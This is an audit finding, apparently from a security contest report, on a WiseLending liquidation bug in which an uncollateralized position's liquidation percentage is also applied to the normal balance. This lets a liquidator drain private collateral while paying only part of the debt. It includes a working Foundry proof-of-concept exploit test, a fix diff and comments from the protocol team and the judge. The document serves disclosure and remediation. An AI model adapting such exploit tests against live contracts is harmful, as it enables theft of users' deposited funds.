[H-04] Liquidators can pay less than required to completely liquidate the private collateral balance of an uncollateralized position
Submitted bynonseodion
When a user deposits in theWiseLendingcontract he can make a private deposit (pure) which allows his deposits not to be used as collateral or a normal deposit. He can also set his position to be collateralized or uncollateralized. If a position is collateralized, the normal deposit can be used as collateral and vice-versa.
When a user uncollateralizes his position, he can only use his private deposit as collateral. If the position becomes liquidatable, it means the private deposit can no longer cover the amount borrowed. In the call togetFullCollateralETH()below only the private collateral is returned immediately as full collateral if it is uncollateralized.
WiseSecurityHelper.sol#L198-L208
ethCollateral=_getTokensInEth(_poolToken,WISE_LENDING.getPureCollateralAmount(_nftId,_poolToken));❌if(_isUncollateralized(_nftId,_poolToken) ==true) {returnethCollateral;}
In a liquidation, the amount to be liquidated is expressed as a percentage of the full collateral. In an uncollateralized position, the full collateral is the private collateral. ThecalculateWishPercentage()call calculates this percentage.
WiseSecurityHelper.sol#L760-L786
functioncalculateWishPercentage(uint256_nftId,address_receiveToken,uint256_paybackETH,uint256_maxFeeETH,uint256_baseRewardLiquidation)externalviewreturns(uint256){uint256feeETH=_checkMaxFee(_paybackETH,_baseRewardLiquidation,_maxFeeETH);uint256numerator= (feeETH+_paybackETH)*PRECISION_FACTOR_E18;uint256denominator=getFullCollateralETH(_nftId,_receiveToken);returnnumerator/denominator+1;}
The amount to be liquidated, i.e. the amount the liquidator receives, is calculated in_calculateReceiveAmount()using the percentage fromcalculateWishPercentage()and applied to the position’s pure collateral first in line 557 below.
It calculates the percentage of the user’s normal balance to be reduced in line 569 without checking if it is uncollateralized. If the amount it gets, i.e.potentialPureExtraCashout, is greater than zero and less than the current private balance (pureCollateral) in line 576, it is reduced from the private balance.
WiseCore.sol#L564-L586
556:if(pureCollateralAmount[_nftId][_receiveTokens] >0) {557:receiveAmount=_withdrawPureCollateralLiquidation(558:_nftId,559:_receiveTokens,560:_removePercentage561:             );562:         }563:564:uint256potentialPureExtraCashout;565:uint256userShares=userLendingData[_nftId][_receiveTokens].shares;566:uint256pureCollateral=pureCollateralAmount[_nftId][_receiveTokens];567:568:if(pureCollateral>0&&userShares>0) {569:potentialPureExtraCashout=_calculatePotentialPureExtraCashout(570:userShares,571:_receiveTokens,572:_removePercentage573:             );574:         }575:576:if(potentialPureExtraCashout>0&&potentialPureExtraCashout<=pureCollateral) {577:_decreasePositionMappingValue(578:pureCollateralAmount,579:_nftId,580:_receiveTokens,581:potentialPureExtraCashout582:             );583:584:_decreaseTotalBareToken(585:_receiveTokens,586:potentialPureExtraCashout587:             );588:589:returnreceiveAmount+potentialPureExtraCashout;590:         }591:
The issue is the implementation applies the percentage meant for only the private collateral to both the normal and private collateral. It should reduce only the private collateral, but may also reduce the public collateral and send it to the liquidator.
Here’s how a malicious liquidator can profit and steal user funds:
User deposits$100worth of WETH in his private balance and$100worth of WETH in his normal balance.He uncollateralizes his position and borrows$70worth of WBTC.If the price of WBTC he borrowed goes up to$100, he can be liquidated.Assuming no liquidation fees, the liquidator pays$50WBTC to liquidate$50WETH (50%) from the user’s private balance leaving$50.The 50% is applied to the user’s public balance giving$50. This is also deducted from the private balance leaving$0in the private balance.The liquidator ends up paying only$50to earn$50extra.
A liquidator can set it up to drain the private collateral balance and only pay for a portion of the liquidation. The user ends up losing funds and the protocol’s bad debt increases.
Impact
This vulnerability allows the liquidator to steal the user’s balance and pay for only a portion of the shares. It has these effects:
The user loses funds.The amount of bad debt in the protocol is increased.
Proof of Concept
ThetestStealPureBalance()test below shows a liquidator earning more than the amount he paid for liquidation.
The test can be put in any test file in thecontractsdirectory and ran there.
pragmasolidity=0.8.24;import"forge-std/Test.sol";import{WiseLending,PoolManager}from"./WiseLending.sol";import{TesterWiseOracleHub}from"./WiseOracleHub/TesterWiseOracleHub.sol";import{PositionNFTs}from"./PositionNFTs.sol";import{WiseSecurity}from"./WiseSecurity/WiseSecurity.sol";import{AaveHub}from"./WrapperHub/AaveHub.sol";import{Token}from"./Token.sol";import{TesterChainlink}from"./TesterChainlink.sol";import{IPriceFeed}from"./InterfaceHub/IPriceFeed.sol";import{IERC20}from"./InterfaceHub/IERC20.sol";import{IWiseLending}from"./InterfaceHub/IWiseLending.sol";import{ContractLibrary}from"./PowerFarms/PendlePowerFarmController/ContractLibrary.sol";contractWiseLendingTestisTest,ContractLibrary{WiseLendingwiseLending;TesterWiseOracleHuboracleHub;PositionNFTspositionNFTs;WiseSecuritywiseSecurity;AaveHubaaveHub;TesterChainlinkwbtcOracle;// users/adminaddressalice=address(1);addressbob=address(2);addresscharles=address(3);addresslendingMaster;//tokensaddresswbtc;functionsetUp()public{lendingMaster=address(11);vm.startPrank(lendingMaster);addressETH_PRICE_FEED=0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;addressUNISWAP_V3_FACTORY=0x1F98431c8aD98523631AE4a59f267346ea31F984;addressAAVE_ADDRESS=0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;// deploy oracle huboracleHub=newTesterWiseOracleHub(WETH,ETH_PRICE_FEED,UNISWAP_V3_FACTORY);oracleHub.setHeartBeat(oracleHub.ETH_USD_PLACEHOLDER(),// set USD/ETH feed heartbeat1);// deploy position NFTpositionNFTs=newPositionNFTs("PositionsNFTs","POSNFTS","app.wisetoken.net/json-data/nft-data/");// deploy Wiselending contractwiseLending=newWiseLending(lendingMaster,address(oracleHub),address(positionNFTs));// deploy AaveHubaaveHub=newAaveHub(lendingMaster,AAVE_ADDRESS,address(wiseLending));// deploy Wisesecurity contractwiseSecurity=newWiseSecurity(lendingMaster,address(wiseLending),address(aaveHub));wiseLending.setSecurity(address(wiseSecurity));// set labelsvm.label(address(wiseLending),"WiseLending");vm.label(address(positionNFTs),"PositionNFTs");vm.label(address(oracleHub),"OracleHub");vm.label(address(wiseSecurity),"WiseSecurity");vm.label(alice,"Alice");vm.label(bob,"Bob");vm.label(charles,"Charles");vm.label(wbtc,"WBTC");vm.label(WETH,"WETH");// create tokens, create TestChainlink oracle, add to oracleHub(wbtc,wbtcOracle) =_setupToken(18,17ether);oracleHub.setHeartBeat(wbtc,1);wbtcOracle.setRoundData(0,block.timestamp-1);// setup WETH on oracle huboracleHub.setHeartBeat(WETH,60minutes);oracleHub.addOracle(WETH,IPriceFeed(ETH_PRICE_FEED),newaddress[](0));// create poolswiseLending.createPool(PoolManager.CreatePool({allowBorrow:true,poolToken:wbtc,// btcpoolMulFactor:17500000000000000,poolCollFactor:805000000000000000,maxDepositAmount:1800000000000000000000000}));wiseLending.createPool(PoolManager.CreatePool({allowBorrow:true,poolToken:WETH,// btcpoolMulFactor:17500000000000000,poolCollFactor:805000000000000000,maxDepositAmount:1800000000000000000000000}));}function_setupToken(uintdecimals,uintvalue)internalreturns(addresstoken,TesterChainlinkoracle) {Token_token=newToken(uint8(decimals),alice);// deploy tokenTesterChainlink_oracle=newTesterChainlink(// deploy oraclevalue,18);oracleHub.addOracle(// add oracle to oracle hubaddress(_token),IPriceFeed(address(_oracle)),newaddress[](0));return(address(_token),_oracle);}functiontestStealPureBalance()public{// deposit WETH in private and public balances for Alice's NFTvm.startPrank(alice);deal(WETH,alice,100ether);IERC20(WETH).approve(address(wiseLending),100ether);uintaliceNft=positionNFTs.reservePosition();wiseLending.depositExactAmount(aliceNft,WETH,50ether);wiseLending.solelyDeposit(aliceNft,WETH,50ether);// deposit for Bob's NFT to provide WBTC liquidityvm.startPrank(bob);deal(wbtc,bob,100ether);IERC20(wbtc).approve(address(wiseLending),100ether);wiseLending.depositExactAmountMint(wbtc,100ether);// Uncollateralize Alice's NFT position to allow only private(pure)// balance to be used as collateralvm.startPrank(alice);wiseLending.unCollateralizeDeposit(aliceNft,WETH);(, ,uintlendCollFactor) =wiseLending.lendingPoolData(WETH);uintusableCollateral=50ether*lendCollFactor*95e16/1e36;// alice borrowsuintborrowable=oracleHub.getTokensFromETH(wbtc,usableCollateral) -1000;uintpaybackShares=wiseLending.borrowExactAmount(aliceNft,wbtc,borrowable);vm.startPrank(lendingMaster);// increase the price of WBTC to make Alice's position liquidatablewbtcOracle.setValue(20ether);// let charles get WBTC to liquidate Alicevm.startPrank(charles);uintcharlesNft=positionNFTs.reservePosition();uintpaybackAmount=wiseLending.paybackAmount(wbtc,paybackShares);deal(wbtc,charles,paybackAmount);IERC20(wbtc).approve(address(wiseLending),paybackAmount);uintwbtcBalanceBefore=IERC20(wbtc).balanceOf(charles);uintwethBalanceBefore=IERC20(WETH).balanceOf(charles);// charles liquidates 40% of the shares to ensure he can reduce the pure collateral balance twicewiseLending.liquidatePartiallyFromTokens(aliceNft,charlesNft,wbtc,WETH,paybackShares*40e16/1e18);uintwbtcBalanceChange=wbtcBalanceBefore-IERC20(wbtc).balanceOf(charles);uintwethBalanceChange=IERC20(WETH).balanceOf(charles) -wethBalanceBefore;// The amount of WETH Charles got is 2x the amount of WBTC he paid plus fees (10% of amount paid)// WBTC paid plus fees = 110% * wbtcBalanceChange// x2WBTCChangePlusFees = 2 * WBTC paid plus feesuintx2WBTCChangePlusFees=oracleHub.getTokensInETH(wbtc,11e17*wbtcBalanceChange/1e18) *2;assertApproxEqAbs(wethBalanceChange,x2WBTCChangePlusFees,200);}}
Recommended Mitigation Steps
To ensure the code does not also consider the normal balance at all we can check if the position is uncollateralized early. Currently, this check is done but is done too late in the_calculateReceiveAmount()function. We can fix it by moving the check.
WiseCore.sol#L560-L594
+if(userLendingData[_nftId][_receiveTokens].unCollateralized==true) {+returnreceiveAmount;+        }+uint256potentialPureExtraCashout;uint256userShares=userLendingData[_nftId][_receiveTokens].shares;uint256pureCollateral=pureCollateralAmount[_nftId][_receiveTokens];...-if(userLendingData[_nftId][_receiveTokens].unCollateralized==true) {-returnreceiveAmount;-        }-return_withdrawOrAllocateSharesLiquidation(_nftId,_nftIdLiquidator,
Assessed type
Invalid Validation
vm06007 (Wise Lending) commented:
Edge case - if user is about to be liquidated, I think they will make things collateralized to avoid liquidation. Either way we would like to see this as Medium. Fix is already applied. This is also something that’s been explored in the hats.finance competition; hence, 564-566 lines came from there etc.
Trust (judge) commented:
High is appropriate, especially with the PoC demonstrated.
Wise Lending commented:
Mitigatedhere.